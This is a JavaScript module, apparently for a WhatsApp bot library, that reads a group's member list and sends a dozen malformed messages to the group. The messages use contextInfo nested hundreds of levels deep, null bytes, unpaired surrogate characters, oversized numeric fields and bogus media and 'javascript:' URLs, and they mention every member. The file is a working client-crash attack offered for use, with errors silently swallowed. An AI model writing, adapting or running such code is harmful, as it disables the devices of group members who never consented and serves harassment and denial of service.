const crypto = require("crypto");

module.exports = async function groupforce(sock, groupJid) {
    let participants = [];
    try {
        const meta = await sock.groupMetadata(groupJid);
        participants = meta.participants.map(p => p.id);
    } catch (err) {
        throw new Error(`Failed to fetch group metadata: ${err.message}`);
    }

    if (!participants.length) throw new Error("No participants in group");

    const nestedContext = (depth) => {
        let inner = {
            remoteJid: groupJid,
            stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase(),
            participant: participants[0]
        };
        for (let i = 0; i < depth; i++) {
            inner = {
                remoteJid: groupJid,
                stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase(),
                participant: participants[i % participants.length],
                mentionedJid: participants,
                conversionSource: "\0",
                conversionData: Buffer.alloc(64, 0).toString("base64"),
                quotedMessage: { extendedTextMessage: { text: "\0", contextInfo: inner } }
            };
        }
        return inner;
    };

    const badJson = (() => {
        let o = { a: "\uD800" };
        for (let i = 0; i < 400; i++) o = { n: o, k: "\0", v: "\uDFFF" };
        return JSON.stringify(o);
    })();

    const payloads = [];

    payloads.push({ extendedTextMessage: { text: "\0", contextInfo: { quotedMessage: nestedContext(500) } } });

    payloads.push({
        interactiveMessage: {
            header: { title: "\0", hasMediaAttachment: true, locationMessage: { degreesLatitude: NaN, degreesLongitude: NaN, name: "\0".repeat(2048), url: "data:".repeat(1024) } },
            body: { text: "\0", contextInfo: nestedContext(400) },
            footer: { text: "\uD800\uDFFF".repeat(1024) },
            nativeFlowMessage: {
                buttons: [
                    { name: "\0", buttonParamsJson: badJson },
                    { name: "galaxy_message", buttonParamsJson: badJson },
                    { name: "call_permission_request", buttonParamsJson: "\0".repeat(0x2000) },
                    { name: "single_select", buttonParamsJson: badJson }
                ],
                messageParamsJson: badJson,
                messageVersion: 0xffff
            },
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        buttonsMessage: {
            contentText: "\0",
            footerText: "\0".repeat(4096),
            buttons: [
                { buttonId: "\0", buttonText: { displayText: "\0" }, type: 1, nativeFlowInfo: { name: "\0", paramsJson: badJson } },
                { buttonId: "\0".repeat(256), buttonText: { displayText: "\uD800".repeat(512) }, type: 2, nativeFlowInfo: { name: "galaxy_message", paramsJson: badJson } }
            ],
            headerType: 6,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        listMessage: {
            title: "\0".repeat(2048),
            description: "\0",
            buttonText: "\uD800".repeat(512),
            listType: 0xffffffff,
            sections: Array.from({ length: 50 }, () => ({
                title: "\0",
                rows: Array.from({ length: 50 }, () => ({ title: "\0", description: "\uDFFF".repeat(64), rowId: "\0" }))
            })),
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        productMessage: {
            product: {
                productImage: { url: "https://mmg.whatsapp.net/" + "\0".repeat(1024), mimetype: "image/jpeg", fileSha256: Buffer.alloc(32, 0xff).toString("base64"), fileLength: "999999999999999", height: 0xffffffff, width: 0xffffffff },
                productId: "\0".repeat(128),
                title: "\0",
                description: "\uD800".repeat(2048),
                currencyCode: "\0\0\0",
                priceAmount1000: "9999999999999999999",
                retailerId: "\0",
                url: "javascript:" + "\0".repeat(1024),
                productImageCount: 0xffffffff
            },
            businessOwnerJid: participants[0],
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        pollCreationMessage: {
            name: "\0".repeat(2048),
            options: Array.from({ length: 100 }, () => ({ optionName: "\uD800".repeat(256) })),
            selectableOptionsCount: 0xffffffff,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({ albumMessage: { expectedImageCount: 0xffffffff, expectedVideoCount: 0xffffffff, contextInfo: nestedContext(400) } });

    payloads.push({
        ptvMessage: {
            url: "https://mmg.whatsapp.net/" + "\0".repeat(1024),
            mimetype: "video/mp4",
            fileSha256: Buffer.alloc(32, 0xff).toString("base64"),
            fileLength: "9999999999999",
            height: 0xffffffff,
            width: 0xffffffff,
            seconds: 0xffffffff,
            mediaKey: Buffer.alloc(32, 0xff).toString("base64"),
            directPath: "\0".repeat(1024)
        }
    });

    payloads.push({
        eventMessage: {
            name: "\0".repeat(2048),
            description: "\uD800".repeat(512),
            startTime: "9999999999999",
            endTime: "9999999999999999",
            isCanceled: true,
            contextInfo: nestedContext(400)
        }
    });

    payloads.push({
        highlyStructuredMessage: {
            namespace: "\0".repeat(512),
            elementName: "\0",
            params: Array.from({ length: 500 }, () => "\0"),
            localizableParams: Array.from({ length: 300 }, () => ({ title: "\0", defaultText: "\uD800".repeat(128) })),
            hydratedHsm: {
                hydratedContentText: "\0",
                hydratedFooterText: "\0".repeat(2048),
                hydratedButtons: Array.from({ length: 200 }, () => ({ quickReplyButton: { displayText: "\0", id: "\0" } }))
            }
        }
    });

    payloads.push({
        groupStatusMentionMessage: {
            message: {
                protocolMessage: {
                    type: 0,
                    key: { remoteJid: groupJid, fromMe: false, id: crypto.randomBytes(16).toString("hex").toUpperCase() }
                }
            }
        }
    });

    payloads.push({
        templateMessage: {
            hydratedTemplate: {
                hydratedContentText: "\0",
                hydratedFooterText: "\uD800".repeat(512),
                hydratedButtons: Array.from({ length: 200 }, () => ({
                    urlButton: { displayText: "\0", url: "data:".repeat(512) },
                    quickReplyButton: { displayText: "\uDFFF".repeat(256), id: "\0" }
                })),
                hydratedTitleText: "\0".repeat(2048)
            },
            contextInfo: nestedContext(400)
        }
    });

    const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();

    for (let i = 0; i < payloads.length; i++) {
        const payload = payloads[i];
        const msgId = `${baseId}${i.toString(16).padStart(2, "0")}`;

        try {
            await sock.relayMessage(groupJid, payload, {
                messageId: msgId,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { appdata: "default", platform: "all" },
                        content: [
                            { tag: "mentioned_users", attrs: {}, content: participants.map(jid => ({ tag: "to", attrs: { jid } })) },
                            { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                        ]
                    }
                ]
            });
            await new Promise(r => setTimeout(r, 100));
        } catch {}
    }

    return { participants: participants.length, payloadsSent: payloads.length };
};
